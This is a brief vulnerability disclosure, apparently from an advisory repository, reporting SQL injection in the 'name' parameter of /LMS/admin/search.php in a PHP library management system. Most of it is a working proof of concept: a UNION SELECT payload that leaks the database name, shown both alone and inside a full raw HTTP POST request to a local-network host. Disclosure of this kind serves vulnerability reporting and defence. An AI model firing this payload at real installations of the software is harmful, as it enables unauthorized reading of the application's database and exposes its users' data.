# Library Management System v1.0 by kingbhob02 has SQL injection

vendors: https://www.sourcecodester.com/php/15434/library-management-system-qr-code-attendance-and-auto-generate-library-card.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /LMS/admin/search.php

Vulnerability location: /LMS/admin/search.php, name

[+] Payload: name=11'+union+select+1,database(),3,4--+&atay= // Leak place ---> name

```sql
POST /LMS/admin/search.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=7v8p4p3goshl3b4fkncu3bh9ui
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

name=11'+union+select+1,database(),3,4--+&atay=
```

![image](https://user-images.githubusercontent.com/54017627/180446091-3877d0a6-8ee9-4913-9d54-f595393e41e9.png)
